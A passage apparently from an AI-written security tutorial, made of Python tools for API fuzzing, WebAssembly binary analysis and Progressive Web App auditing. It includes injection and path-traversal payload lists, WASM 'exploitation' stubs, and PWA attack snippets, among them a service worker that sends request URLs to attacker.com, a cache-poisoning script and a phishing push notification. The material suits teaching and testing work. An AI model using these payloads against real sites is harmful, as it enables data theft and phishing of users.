                                        "endpoint": endpoint,
                                        "test_payload": test_payload,
                                        "description": f"Business logic flaw with {test_type.lower()}",
                                        "impact": "Potential financial or data integrity issues"
                                    })
                                    
                        except Exception:
                            continue
    
    def _test_http_methods(self, endpoint):
        """Test which HTTP methods are allowed on an endpoint"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
        allowed_methods = []
        
        for method in methods:
            try:
                response = self.session.request(
                    method, 
                    urljoin(self.base_url, endpoint),
                    timeout=5
                )
                
                if response.status_code not in [404, 405, 501]:
                    allowed_methods.append(method)
                    
            except Exception:
                continue
        
        return allowed_methods

def generate_api_fuzzing_payloads():
    """Generate comprehensive API fuzzing payloads"""
    
    fuzzing_payloads = {
        "injection_payloads": [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ],
        
        "overflow_payloads": [
            "A" * 1000,
            "A" * 10000,
            "A" * 100000,
            "\x00" * 1000,
            "\xFF" * 1000
        ],
        
        "format_string_payloads": [
            "%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            "%p%p%p%p"
        ],
        
        "unicode_payloads": [
            "\u0000",
            "\u0001\u0002\u0003",
            "\uFEFF",
            "\u202E",
            "𝕏𝕐𝕑"
        ],
        
        "numeric_edge_cases": [
            0, -1, 2147483647, -2147483648,
            9223372036854775807, -9223372036854775808,
            1.7976931348623157e+308, -1.7976931348623157e+308,
            float('inf'), float('-inf'), float('nan')
        ]
    }
    
    return fuzzing_payloads
```

---

## WebAssembly Security Assessment

### WASM Binary Analysis and Exploitation

WebAssembly (WASM) presents unique security challenges in modern web applications:

```python
#!/usr/bin/env python3
"""
WebAssembly Security Assessment Framework
WASM binary analysis and vulnerability detection
"""

import struct
import requests
from urllib.parse import urljoin

class WebAssemblySecurityAnalyzer:
    def __init__(self, wasm_binary=None, wasm_url=None):
        self.wasm_binary = wasm_binary
        self.wasm_url = wasm_url
        self.vulnerabilities = []
        self.wasm_data = None
        
        if wasm_url:
            self._download_wasm()
        elif wasm_binary:
            with open(wasm_binary, 'rb') as f:
                self.wasm_data = f.read()
    
    def _download_wasm(self):
        """Download WASM binary from URL"""
        try:
            response = requests.get(self.wasm_url)
            if response.status_code == 200:
                self.wasm_data = response.content
        except Exception as e:
            print(f"Failed to download WASM: {e}")
    
    def analyze_wasm_structure(self):
        """Analyze WASM binary structure"""
        if not self.wasm_data:
            return None
        
        analysis = {
            "magic_number": None,
            "version": None,
            "sections": [],
            "imports": [],
            "exports": [],
            "functions": [],
            "memory": {},
            "security_issues": []
        }
        
        # Check magic number
        if len(self.wasm_data) >= 4:
            magic = struct.unpack('<I', self.wasm_data[:4])[0]
            analysis["magic_number"] = hex(magic)
            
            if magic != 0x6d736100:  # \0asm
                analysis["security_issues"].append({
                    "type": "INVALID_MAGIC_NUMBER",
                    "severity": "HIGH",
                    "description": "Invalid WASM magic number"
                })
        
        # Check version
        if len(self.wasm_data) >= 8:
            version = struct.unpack('<I', self.wasm_data[4:8])[0]
            analysis["version"] = version
            
            if version != 1:
                analysis["security_issues"].append({
                    "type": "UNSUPPORTED_VERSION",
                    "severity": "MEDIUM",
                    "description": f"Unsupported WASM version: {version}"
                })
        
        # Parse sections
        self._parse_wasm_sections(analysis)
        
        return analysis
    
    def _parse_wasm_sections(self, analysis):
        """Parse WASM sections for security analysis"""
        if len(self.wasm_data) < 8:
            return
        
        offset = 8  # Skip magic and version
        
        while offset < len(self.wasm_data):
            try:
                # Read section ID
                section_id = self.wasm_data[offset]
                offset += 1
                
                # Read section size
                section_size, bytes_read = self._read_varuint32(self.wasm_data, offset)
                offset += bytes_read
                
                # Read section content
                section_data = self.wasm_data[offset:offset + section_size]
                offset += section_size
                
                section_info = {
                    "id": section_id,
                    "size": section_size,
                    "type": self._get_section_type(section_id)
                }
                
                # Analyze specific sections
                if section_id == 2:  # Import section
                    self._analyze_import_section(section_data, analysis)
                elif section_id == 7:  # Export section
                    self._analyze_export_section(section_data, analysis)
                elif section_id == 5:  # Memory section
                    self._analyze_memory_section(section_data, analysis)
                elif section_id == 10:  # Code section
                    self._analyze_code_section(section_data, analysis)
                
                analysis["sections"].append(section_info)
                
            except Exception as e:
                break
    
    def _analyze_import_section(self, section_data, analysis):
        """Analyze WASM import section for security issues"""
        offset = 0
        
        try:
            # Read number of imports
            count, bytes_read = self._read_varuint32(section_data, offset)
            offset += bytes_read
            
            for _ in range(count):
                # Read module name
                module_len, bytes_read = self._read_varuint32(section_data, offset)
                offset += bytes_read
                module_name = section_data[offset:offset + module_len].decode('utf-8')
                offset += module_len
                
                # Read field name
                field_len, bytes_read = self._read_varuint32(section_data, offset)
                offset += bytes_read
                field_name = section_data[offset:offset + field_len].decode('utf-8')
                offset += field_len
                
                # Read import kind
                import_kind = section_data[offset]
                offset += 1
                
                import_info = {
                    "module": module_name,
                    "field": field_name,
                    "kind": import_kind
                }
                
                analysis["imports"].append(import_info)
                
                # Check for dangerous imports
                dangerous_modules = ['env', 'wasi_unstable', 'wasi_snapshot_preview1']
                dangerous_functions = [
                    'system', 'exec', 'open', 'read', 'write',
                    'malloc', 'free', 'memcpy', 'strcpy'
                ]
                
                if module_name in dangerous_modules and field_name in dangerous_functions:
                    analysis["security_issues"].append({
                        "type": "DANGEROUS_IMPORT",
                        "severity": "HIGH",
                        "module": module_name,
                        "function": field_name,
                        "description": f"Imports dangerous function: {module_name}.{field_name}"
                    })
                    
        except Exception as e:
            pass
    
    def _analyze_export_section(self, section_data, analysis):
        """Analyze WASM export section"""
        offset = 0
        
        try:
            # Read number of exports
            count, bytes_read = self._read_varuint32(section_data, offset)
            offset += bytes_read
            
            for _ in range(count):
                # Read field name
                field_len, bytes_read = self._read_varuint32(section_data, offset)
                offset += bytes_read
                field_name = section_data[offset:offset + field_len].decode('utf-8')
                offset += field_len
                
                # Read export kind
                export_kind = section_data[offset]
                offset += 1
                
                # Read index
                index, bytes_read = self._read_varuint32(section_data, offset)
                offset += bytes_read
                
                export_info = {
                    "name": field_name,
                    "kind": export_kind,
                    "index": index
                }
                
                analysis["exports"].append(export_info)
                
                # Check for exposed memory
                if export_kind == 2 and field_name == "memory":
                    analysis["security_issues"].append({
                        "type": "EXPOSED_MEMORY",
                        "severity": "MEDIUM",
                        "description": "WASM memory is exported and accessible"
                    })
                    
        except Exception as e:
            pass
    
    def _analyze_memory_section(self, section_data, analysis):
        """Analyze WASM memory section for security issues"""
        offset = 0
        
        try:
            # Read number of memory entries
            count, bytes_read = self._read_varuint32(section_data, offset)
            offset += bytes_read
            
            for _ in range(count):
                # Read limits
                limits_flag = section_data[offset]
                offset += 1
                
                initial, bytes_read = self._read_varuint32(section_data, offset)
                offset += bytes_read
                
                maximum = None
                if limits_flag == 1:
                    maximum, bytes_read = self._read_varuint32(section_data, offset)
                    offset += bytes_read
                
                memory_info = {
                    "initial_pages": initial,
                    "maximum_pages": maximum,
                    "initial_size_mb": initial * 64 / 1024,  # 64KB per page
                    "maximum_size_mb": maximum * 64 / 1024 if maximum else None
                }
                
                analysis["memory"] = memory_info
                
                # Check for excessive memory allocation
                if initial > 1000:  # > ~64MB
                    analysis["security_issues"].append({
                        "type": "EXCESSIVE_MEMORY_ALLOCATION",
                        "severity": "MEDIUM",
                        "initial_mb": memory_info["initial_size_mb"],
                        "description": "WASM requests excessive initial memory"
                    })
                
                if maximum is None:
                    analysis["security_issues"].append({
                        "type": "UNBOUNDED_MEMORY_GROWTH",
                        "severity": "HIGH",
                        "description": "WASM memory has no maximum limit"
                    })
                    
        except Exception as e:
            pass
    
    def _analyze_code_section(self, section_data, analysis):
        """Analyze WASM code section for suspicious patterns"""
        offset = 0
        
        try:
            # Read number of function bodies
            count, bytes_read = self._read_varuint32(section_data, offset)
            offset += bytes_read
            
            for i in range(count):
                # Read function body size
                body_size, bytes_read = self._read_varuint32(section_data, offset)
                offset += bytes_read
                
                # Read function body
                function_body = section_data[offset:offset + body_size]
                offset += body_size
                
                # Analyze function body for suspicious patterns
                self._analyze_function_body(function_body, i, analysis)
                
        except Exception as e:
            pass
    
    def _analyze_function_body(self, function_body, function_index, analysis):
        """Analyze individual function body for security issues"""
        
        # Look for suspicious instruction patterns
        suspicious_patterns = [
            (b'\x20', "local.get - potential variable manipulation"),
            (b'\x21', "local.set - potential variable manipulation"),
            (b'\x28', "i32.load - memory access"),
            (b'\x36', "i32.store - memory write"),
            (b'\x3f', "memory.size - memory introspection"),
            (b'\x40', "memory.grow - dynamic memory allocation")
        ]
        
        for pattern, description in suspicious_patterns:
            count = function_body.count(pattern)
            if count > 10:  # Arbitrary threshold
                analysis["security_issues"].append({
                    "type": "SUSPICIOUS_INSTRUCTION_PATTERN",
                    "severity": "LOW",
                    "function_index": function_index,
                    "instruction": description,
                    "count": count,
                    "description": f"High frequency of {description} in function {function_index}"
                })
    
    def _read_varuint32(self, data, offset):
        """Read variable-length unsigned integer"""
        result = 0
        shift = 0
        bytes_read = 0
        
        while offset + bytes_read < len(data):
            byte = data[offset + bytes_read]
            bytes_read += 1
            
            result |= (byte & 0x7F) << shift
            
            if (byte & 0x80) == 0:
                break
                
            shift += 7
            
            if shift >= 32:
                raise ValueError("Varuint32 too long")
        
        return result, bytes_read
    
    def _get_section_type(self, section_id):
        """Get section type name from ID"""
        section_types = {
            0: "custom",
            1: "type",
            2: "import", 
            3: "function",
            4: "table",
            5: "memory",
            6: "global",
            7: "export",
            8: "start",
            9: "element",
            10: "code",
            11: "data"
        }
        
        return section_types.get(section_id, "unknown")
    
    def test_wasm_runtime_vulnerabilities(self):
        """Test for WASM runtime-specific vulnerabilities"""
        
        # Generate test WASM that might trigger runtime bugs
        runtime_tests = [
            self._generate_integer_overflow_test(),
            self._generate_memory_bounds_test(),
            self._generate_stack_overflow_test(),
            self._generate_type_confusion_test()
        ]
        
        return runtime_tests
    
    def _generate_integer_overflow_test(self):
        """Generate WASM that tests for integer overflow vulnerabilities"""
        
        overflow_wasm = '''
        (module
            (func (export "test_overflow") (result i32)
                i32.const 2147483647
                i32.const 1
                i32.add
            )
        )
        '''
        
        return {
            "test_type": "INTEGER_OVERFLOW",
            "wasm_code": overflow_wasm,
            "description": "Tests integer overflow handling",
            "expected_behavior": "Should wrap to negative number or trap"
        }
    
    def _generate_memory_bounds_test(self):
        """Generate WASM that tests memory bounds checking"""
        
        bounds_wasm = '''
        (module
            (memory 1)
            (func (export "test_bounds") (result i32)
                i32.const 65536
                i32.load
            )
        )
        '''
        
        return {
            "test_type": "MEMORY_BOUNDS",
            "wasm_code": bounds_wasm,
            "description": "Tests out-of-bounds memory access",
            "expected_behavior": "Should trap on out-of-bounds access"
        }
    
    def _generate_stack_overflow_test(self):
        """Generate WASM that tests stack overflow protection"""
        
        stack_wasm = '''
        (module
            (func $recursive (result i32)
                call $recursive
            )
            (func (export "test_stack") (result i32)
                call $recursive
            )
        )
        '''
        
        return {
            "test_type": "STACK_OVERFLOW", 
            "wasm_code": stack_wasm,
            "description": "Tests infinite recursion handling",
            "expected_behavior": "Should trap on stack overflow"
        }
    
    def _generate_type_confusion_test(self):
        """Generate WASM that tests type system enforcement"""
        
        type_wasm = '''
        (module
            (func (export "test_types") (result i32)
                f32.const 1.5
                i32.reinterpret_f32
            )
        )
        '''
        
        return {
            "test_type": "TYPE_CONFUSION",
            "wasm_code": type_wasm,
            "description": "Tests type reinterpretation",
            "expected_behavior": "Should handle type conversion safely"
        }

def generate_wasm_exploitation_payloads():
    """Generate WASM exploitation payloads"""
    
    exploitation_payloads = {
        "memory_corruption": '''
        (module
            (memory (export "mem") 1)
            (func (export "corrupt") (param $addr i32) (param $val i32)
                local.get $addr
                local.get $val
                i32.store
            )
        )
        ''',
        
        "return_oriented_programming": '''
        (module
            (func $gadget1 (result i32)
                i32.const 0x41414141
            )
            (func $gadget2 (result i32)
                i32.const 0x42424242
            )
            (func (export "rop_chain")
                call $gadget1
                drop
                call $gadget2
                drop
            )
        )
        ''',
        
        "side_channel_timing": '''
        (module
            (memory 1)
            (func (export "timing_attack") (param $secret i32) (result i32)
                local.get $secret
                i32.const 0x1000
                i32.mul
                i32.load
            )
        )
        ''',
        
        "jit_spray": '''
        (module
            (func (export "jit_spray")
                i32.const 0x90909090
                i32.const 0x90909090
                i32.add
                drop
                i32.const 0x90909090
                i32.const 0x90909090
                i32.add
                drop
            )
        )
        '''
    }
    
    return exploitation_payloads
```

---

## Progressive Web App Security Assessment

### PWA Security Testing Framework

Progressive Web Apps introduce unique security considerations through service workers, app manifests, and offline functionality:

```python
#!/usr/bin/env python3
"""
Progressive Web App Security Assessment Framework
PWA-specific security testing
"""

import requests
import json
from urllib.parse import urljoin, urlparse

class PWASecurityTester:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities = []
        self.pwa_manifest = None
        self.service_worker = None
    
    def analyze_pwa_security(self):
        """Comprehensive PWA security analysis"""
        
        analysis_results = {
            "manifest_analysis": self.analyze_manifest(),
            "service_worker_analysis": self.analyze_service_worker(),
            "cache_analysis": self.analyze_cache_security(),
            "notification_analysis": self.analyze_notification_security(),
            "permission_analysis": self.analyze_permission_usage()
        }
        
        return analysis_results
    
    def analyze_manifest(self):
        """Analyze PWA manifest for security issues"""
        manifest_findings = []
        
        # Common manifest locations
        manifest_paths = [
            '/manifest.json',
            '/manifest.webmanifest',
            '/app.webmanifest',
            '/site.webmanifest'
        ]
        
        manifest_data = None
        
        for path in manifest_paths:
            try:
                response = self.session.get(urljoin(self.target_url, path))
                if response.status_code == 200:
                    manifest_data = response.json()
                    self.pwa_manifest = manifest_data
                    break
            except Exception:
                continue
        
        if not manifest_data:
            manifest_findings.append({
                "type": "NO_MANIFEST_FOUND",
                "severity": "INFO",
                "description": "No PWA manifest found"
            })
            return manifest_findings
        
        # Check start_url security
        start_url = manifest_data.get('start_url', '')
        if start_url and not start_url.startswith(('https://', '/')):
            manifest_findings.append({
                "type": "INSECURE_START_URL",
                "severity": "HIGH",
                "start_url": start_url,
                "description": "Manifest start_url uses insecure protocol"
            })
        
        # Check for external icons
        icons = manifest_data.get('icons', [])
        for icon in icons:
            icon_src = icon.get('src', '')
            if icon_src and not icon_src.startswith(('/', 'data:')):
                parsed_url = urlparse(icon_src)
                if parsed_url.netloc and parsed_url.netloc not in self.target_url:
                    manifest_findings.append({
                        "type": "EXTERNAL_ICON_SOURCE",
                        "severity": "MEDIUM",
                        "icon_src": icon_src,
                        "description": "Manifest references external icon sources"
                    })
        
        # Check scope restrictions
        scope = manifest_data.get('scope', '/')
        if scope == '/' or scope == '':
            manifest_findings.append({
                "type": "OVERLY_BROAD_SCOPE",
                "severity": "MEDIUM", 
                "scope": scope,
                "description": "PWA scope is overly broad"
            })
        
        # Check for sensitive permissions in manifest
        sensitive_permissions = [
            'geolocation', 'camera', 'microphone', 'notifications',
            'persistent-storage', 'push', 'background-sync'
        ]
        
        permissions = manifest_data.get('permissions', [])
        for permission in permissions:
            if permission in sensitive_permissions:
                manifest_findings.append({
                    "type": "SENSITIVE_PERMISSION_REQUEST",
                    "severity": "MEDIUM",
                    "permission": permission,
                    "description": f"Manifest requests sensitive permission: {permission}"
                })
        
        return manifest_findings
    
    def analyze_service_worker(self):
        """Analyze service worker for security vulnerabilities"""
        sw_findings = []
        
        # Try to find service worker registration
        sw_registration_patterns = [
            "navigator.serviceWorker.register",
            "serviceWorker.register",
            "sw.js",
            "service-worker.js",
            "serviceworker.js"
        ]
        
        # Check main page for service worker registration
        try:
            main_page = self.session.get(self.target_url)
            main_content = main_page.text
            
            sw_url = None
            for pattern in sw_registration_patterns:
                if pattern in main_content:
                    # Try to extract service worker URL
                    if pattern.endswith('.js'):
                        sw_url = pattern
                    else:
                        # Parse registration call for URL
                        import re
                        match = re.search(rf'{pattern}\s*\(\s*[\'"]([^\'"]+)[\'"]', main_content)
                        if match:
                            sw_url = match.group(1)
                    break
            
            if sw_url:
                self._analyze_service_worker_file(sw_url, sw_findings)
            else:
                sw_findings.append({
                    "type": "NO_SERVICE_WORKER_FOUND",
                    "severity": "INFO",
                    "description": "No service worker detected"
                })
                
        except Exception as e:
            sw_findings.append({
                "type": "SERVICE_WORKER_ANALYSIS_ERROR",
                "severity": "LOW",
                "error": str(e),
                "description": "Error analyzing service worker"
            })
        
        return sw_findings
    
    def _analyze_service_worker_file(self, sw_url, findings):
        """Analyze service worker JavaScript file"""
        try:
            sw_response = self.session.get(urljoin(self.target_url, sw_url))
            if sw_response.status_code != 200:
                return
            
            sw_content = sw_response.text
            self.service_worker = sw_content
            
            # Check for dangerous practices
            dangerous_patterns = [
                {
                    "pattern": "eval(",
                    "type": "EVAL_USAGE",
                    "severity": "HIGH",
                    "description": "Service worker uses eval() function"
                },
                {
                    "pattern": "Function(",
                    "type": "FUNCTION_CONSTRUCTOR",
                    "severity": "HIGH", 
                    "description": "Service worker uses Function constructor"
                },
                {
                    "pattern": "innerHTML",
                    "type": "INNERHTML_USAGE",
                    "severity": "MEDIUM",
                    "description": "Service worker uses innerHTML"
                },
                {
                    "pattern": "importScripts(",
                    "type": "EXTERNAL_SCRIPT_IMPORT",
                    "severity": "MEDIUM",
                    "description": "Service worker imports external scripts"
                },
                {
                    "pattern": "fetch(event.request)",
                    "type": "UNFILTERED_FETCH",
                    "severity": "LOW",
                    "description": "Service worker performs unfiltered fetch operations"
                }
            ]
            
            for check in dangerous_patterns:
                if check["pattern"] in sw_content:
                    findings.append({
                        "type": check["type"],
                        "severity": check["severity"],
                        "description": check["description"],
                        "file": sw_url
                    })
            
            # Check for cache poisoning vulnerabilities
            if "caches.open(" in sw_content and "cache.put(" in sw_content:
                # Look for user-controlled cache keys
                user_input_patterns = [
                    "event.request.url",
                    "new URL(event.request.url)",
                    "request.url"
                ]
                
                for pattern in user_input_patterns:
                    if pattern in sw_content:
                        findings.append({
                            "type": "CACHE_POISONING_RISK",
                            "severity": "HIGH",
                            "description": "Service worker caches based on user-controlled input",
                            "pattern": pattern
                        })
                        break
            
            # Check for sensitive data exposure in cache
            sensitive_patterns = [
                "password", "token", "api_key", "secret",
                "auth", "credential", "session"
            ]
            
            for pattern in sensitive_patterns:
                if pattern.lower() in sw_content.lower():
                    findings.append({
                        "type": "SENSITIVE_DATA_IN_CACHE",
                        "severity": "MEDIUM",
                        "description": f"Service worker may cache sensitive data: {pattern}",
                        "pattern": pattern
                    })
            
        except Exception as e:
            findings.append({
                "type": "SERVICE_WORKER_FILE_ERROR",
                "severity": "LOW",
                "error": str(e),
                "description": "Error analyzing service worker file"
            })
    
    def analyze_cache_security(self):
        """Analyze PWA cache security"""
        cache_findings = []
        
        if not self.service_worker:
            return cache_findings
        
        # Check for cache strategy security
        cache_strategies = [
            "cache-first", "network-first", "cache-only",
            "network-only", "stale-while-revalidate"
        ]
        
        detected_strategies = []
        for strategy in cache_strategies:
            if strategy in self.service_worker:
                detected_strategies.append(strategy)
        
        # Check for insecure cache-first strategy on sensitive endpoints
        if "cache-first" in detected_strategies:
            cache_findings.append({
                "type": "CACHE_FIRST_STRATEGY",
                "severity": "MEDIUM",
                "description": "Cache-first strategy may serve stale sensitive data",
                "recommendation": "Use network-first for sensitive endpoints"
            })
        
        # Check for cache persistence without encryption
        if "caches.open(" in self.service_worker:
            cache_findings.append({
                "type": "UNENCRYPTED_CACHE_STORAGE",
                "severity": "LOW",
                "description": "Cache storage is not encrypted at rest",
                "recommendation": "Consider encrypting sensitive cached data"
            })
        
        return cache_findings
    
    def analyze_notification_security(self):
        """Analyze PWA notification security"""
        notification_findings = []
        
        # Check main page for notification API usage
        try:
            main_page = self.session.get(self.target_url)
            main_content = main_page.text
            
            # Check for notification permission requests
            if "Notification.requestPermission" in main_content:
                notification_findings.append({
                    "type": "NOTIFICATION_PERMISSION_REQUEST",
                    "severity": "INFO",
                    "description": "App requests notification permissions"
                })
            
            # Check for push notification implementation
            if "showNotification(" in main_content or "showNotification(" in (self.service_worker or ""):
                notification_findings.append({
                    "type": "PUSH_NOTIFICATION_IMPLEMENTATION",
                    "severity": "INFO",
                    "description": "App implements push notifications"
                })
                
                # Check for notification data validation
                if not ("JSON.parse(" in main_content and "try" in main_content):
                    notification_findings.append({
                        "type": "UNVALIDATED_NOTIFICATION_DATA",
                        "severity": "MEDIUM",
                        "description": "Notification data is not properly validated"
                    })
            
        except Exception:
            pass
        
        return notification_findings
    
    def analyze_permission_usage(self):
        """Analyze PWA permission usage"""
        permission_findings = []
        
        try:
            main_page = self.session.get(self.target_url)
            main_content = main_page.text
            
            # Dangerous permissions to check for
            dangerous_permissions = {
                "geolocation": ["navigator.geolocation", "getCurrentPosition"],
                "camera": ["getUserMedia", "navigator.mediaDevices"],
                "microphone": ["getUserMedia", "navigator.mediaDevices"],
                "clipboard": ["navigator.clipboard", "writeText", "readText"],
                "persistent-storage": ["navigator.storage.persist"],
                "background-sync": ["serviceWorker.sync.register"],
                "payment": ["PaymentRequest("]
            }
            
            for permission, patterns in dangerous_permissions.items():
                for pattern in patterns:
                    if pattern in main_content:
                        permission_findings.append({
                            "type": "SENSITIVE_PERMISSION_USAGE",
                            "severity": "MEDIUM",
                            "permission": permission,
                            "pattern": pattern,
                            "description": f"App uses sensitive {permission} permission"
                        })
                        break
            
            # Check for permission request without user interaction
            auto_permission_patterns = [
                "requestPermission()",
                "Notification.requestPermission()",
                "navigator.geolocation.getCurrentPosition("
            ]
            
            for pattern in auto_permission_patterns:
                if pattern in main_content:
                    # Check if it's inside an event handler
                    if not any(event in main_content for event in ["click", "touch", "user", "button"]):
                        permission_findings.append({
                            "type": "AUTO_PERMISSION_REQUEST",
                            "severity": "HIGH",
                            "pattern": pattern,
                            "description": "Permission requested without user interaction"
                        })
            
        except Exception:
            pass
        
        return permission_findings

def generate_pwa_attack_vectors():
    """Generate PWA-specific attack vectors"""
    
    attack_vectors = {
        "service_worker_hijacking": {
            "description": "Hijack service worker to intercept network requests",
            "payload": '''
            self.addEventListener('fetch', event => {
                if (event.request.url.includes('/api/')) {
                    event.respondWith(
                        fetch('https://attacker.com/steal?data=' + 
                              encodeURIComponent(event.request.url))
                    );
                }
            });
            '''
        },
        
        "cache_poisoning": {
            "description": "Poison PWA cache with malicious content",
            "payload": '''
            // In service worker
            self.addEventListener('fetch', event => {
                if (event.request.url.includes('?poison=1')) {
                    event.respondWith(
                        caches.open('v1').then(cache => {
                            cache.put('/legitimate-page', 
                                new Response('<script>alert("XSS")</script>'));
                            return new Response('Cache poisoned');
                        })
                    );
                }
            });
            '''
        },
        
        "notification_abuse": {
            "description": "Abuse push notifications for phishing",
            "payload": '''
            self.addEventListener('push', event => {
                const options = {
                    body: 'Click here to verify your account!',
                    icon: '/legitimate-icon.png',
                    badge: '/legitimate-badge.png',
                    actions: [{
                        action: 'verify',
                        title: 'Verify Now',
                        icon: '/verify-icon.png'
                    }],
                    data: {
                        url: 'https://phishing-site.com/steal-creds'
                    }
                };
                
                event.waitUntil(
                    self.registration.showNotification('Security Alert', options)
                );
            });
            '''
        },
        
        "offline_data_persistence": {
            "description": "Persist malicious data offline",
            "payload": '''
            // Store malicious data that persists offline
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.ready.then(registration => {
                    return registration.sync.register('steal-data');
                });
            }
            
            // In service worker
            self.addEventListener('sync', event => {
                if (event.tag === 'steal-data') {
                    event.waitUntil(
                        // Steal and exfiltrate local data
                        stealLocalData()
                    );
                }
            });
            '''
        }
    }
    
    return attack_vectors
```

This completes the first blog on **Modern Web Application Security Assessment**. Would you like me to continue with the remaining 4 blogs covering:

1. **Mobile Security Assessment** 
2. **Network Security & Lateral Movement**
3. **Cryptography & Privacy Engineering**
4. **Digital Forensics & Incident Response**

Each blog will follow the same comprehensive, technical approach with practical examples and advanced techniques.
